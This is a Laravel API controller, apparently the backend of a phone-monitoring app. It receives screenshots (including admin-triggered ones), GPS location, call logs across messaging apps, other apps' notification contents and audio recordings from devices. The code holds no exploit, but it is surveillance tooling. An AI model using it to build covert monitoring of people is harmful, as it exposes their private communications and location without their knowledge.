<?php

namespace App\Http\Controllers\Api\V1;

use App\Http\Controllers\Controller;
use App\Models\Screenshot;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class SyncController extends Controller
{
    /**
     * Upload screenshots (single or batch).
     * Supports post-call batch uploads and spacebar-triggered uploads.
     */
    public function uploadScreenshots(Request $request): JsonResponse
    {
        $request->validate([
            'screenshots' => 'required|array|min:1',
            'screenshots.*.file' => 'required|file|mimes:webp,jpg,jpeg,png|max:2048',
            'screenshots.*.trigger_type' => 'required|string|in:spacebar,call,admin_pull,periodic',
            'screenshots.*.call_session_id' => 'nullable|string',
            'screenshots.*.latitude' => 'nullable|numeric',
            'screenshots.*.longitude' => 'nullable|numeric',
            'screenshots.*.captured_at' => 'required|date',
        ]);

        $device = $request->device;
        $uploaded = [];

        foreach ($request->screenshots as $index => $screenshotData) {
            $file = $request->file("screenshots.{$index}.file");
            $path = $file->store("screenshots/{$device->id}/" . now()->format('Y-m-d'), 'local');

            $screenshot = Screenshot::create([
                'device_id' => $device->id,
                'file_path' => $path,
                'file_size' => $file->getSize(),
                'trigger_type' => $screenshotData['trigger_type'],
                'call_session_id' => $screenshotData['call_session_id'] ?? null,
                'latitude' => $screenshotData['latitude'] ?? null,
                'longitude' => $screenshotData['longitude'] ?? null,
                'captured_at' => $screenshotData['captured_at'],
            ]);

            $uploaded[] = $screenshot->id;
        }

        // Update device last seen
        $device->update(['last_seen_at' => now(), 'status' => 'online']);

        return response()->json([
            'success' => true,
            'message' => count($uploaded) . ' screenshot(s) uploaded.',
            'data' => ['screenshot_ids' => $uploaded],
        ]);
    }

    /**
     * Upload a single screenshot file (simpler endpoint for spacebar triggers).
     */
    public function uploadSingleScreenshot(Request $request): JsonResponse
    {
        $request->validate([
            'file' => 'required|file|mimes:webp,jpg,jpeg,png|max:2048',
            'trigger_type' => 'required|string|in:spacebar,call,admin_pull,periodic',
            'call_session_id' => 'nullable|string',
            'latitude' => 'nullable|numeric',
            'longitude' => 'nullable|numeric',
            'captured_at' => 'required|date',
        ]);

        $device = $request->device;
        $file = $request->file('file');
        $path = $file->store("screenshots/{$device->id}/" . now()->format('Y-m-d'), 'local');

        $screenshot = Screenshot::create([
            'device_id' => $device->id,
            'file_path' => $path,
            'file_size' => $file->getSize(),
            'trigger_type' => $request->trigger_type,
            'call_session_id' => $request->call_session_id,
            'latitude' => $request->latitude,
            'longitude' => $request->longitude,
            'captured_at' => $request->captured_at,
        ]);

        $device->update(['last_seen_at' => now(), 'status' => 'online']);

        return response()->json([
            'success' => true,
            'message' => 'Screenshot uploaded.',
            'data' => ['screenshot_id' => $screenshot->id],
        ]);
    }

    /**
     * Upload call history (hourly sync).
     */
    public function uploadCallHistory(Request $request): JsonResponse
    {
        $request->validate([
            'calls' => 'required|array|min:1',
            'calls.*.call_type' => 'required|string|in:incoming,outgoing,missed',
            'calls.*.source' => 'required|string|in:phone,whatsapp,imo,telegram,messenger,other',
            'calls.*.phone_number' => 'nullable|string|max:50',
            'calls.*.contact_name' => 'nullable|string|max:255',
            'calls.*.duration' => 'nullable|integer|min:0',
            'calls.*.call_date' => 'required|date',
        ]);

        $device = $request->device;
        $created = 0;

        foreach ($request->calls as $callData) {
            $device->callLogs()->create($callData);
            $created++;
        }

        $device->update(['last_seen_at' => now(), 'status' => 'online']);

        return response()->json([
            'success' => true,
            'message' => "{$created} call log(s) synced.",
        ]);
    }

    /**
     * Realtime payload upload (response to admin FCM trigger).
     */
    public function uploadRealtimePayload(Request $request): JsonResponse
    {
        $request->validate([
            'screenshot' => 'nullable|file|mimes:webp,jpg,jpeg,png|max:2048',
            'latitude' => 'nullable|numeric',
            'longitude' => 'nullable|numeric',
        ]);

        $device = $request->device;

        // Save screenshot if provided
        if ($request->hasFile('screenshot')) {
            $file = $request->file('screenshot');
            $path = $file->store("screenshots/{$device->id}/realtime", 'local');

            Screenshot::create([
                'device_id' => $device->id,
                'file_path' => $path,
                'file_size' => $file->getSize(),
                'trigger_type' => 'admin_pull',
                'captured_at' => now(),
                'latitude' => $request->latitude,
                'longitude' => $request->longitude,
            ]);
        }

        // Update device location
        $device->update([
            'last_lat' => $request->latitude ?? $device->last_lat,
            'last_lng' => $request->longitude ?? $device->last_lng,
            'last_seen_at' => now(),
            'status' => 'online',
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Realtime payload received.',
        ]);
    }

    /**
     * Upload notification logs.
     */
    public function uploadNotifications(Request $request): JsonResponse
    {
        $request->validate([
            'notifications' => 'required|array|min:1',
            'notifications.*.package_name' => 'required|string',
            'notifications.*.title' => 'nullable|string',
            'notifications.*.body' => 'nullable|string',
            'notifications.*.posted_at' => 'required|date',
        ]);

        $device = $request->device;
        $created = 0;

        foreach ($request->notifications as $notifData) {
            $device->notificationLogs()->create($notifData);
            $created++;
        }

        $device->update(['last_seen_at' => now(), 'status' => 'online']);

        return response()->json([
            'success' => true,
            'message' => "{$created} notification log(s) synced.",
        ]);
    }

    /**
     * Upload dynamic audio recording.
     */
    public function uploadAudio(Request $request): JsonResponse
    {
        $request->validate([
            'audio' => 'required|file|max:30720', // Max 30MB (approx 5-10 mins audio)
            'duration_seconds' => 'required|integer|min:1',
            'recorded_at' => 'required|date',
        ]);

        $device = $request->device;
        $file = $request->file('audio');

        $filename = time() . '_' . uniqid() . '.' . $file->getClientOriginalExtension();
        $path = $file->storeAs("audio/{$device->id}", $filename, 'local');

        $device->audioRecordings()->create([
            'file_path' => $path,
            'duration_seconds' => $request->duration_seconds,
            'recorded_at' => \Illuminate\Support\Carbon::parse($request->recorded_at),
        ]);

        $device->update(['last_seen_at' => now(), 'status' => 'online']);

        return response()->json([
            'success' => true,
            'message' => 'Audio recording uploaded successfully.',
        ]);
    }
}
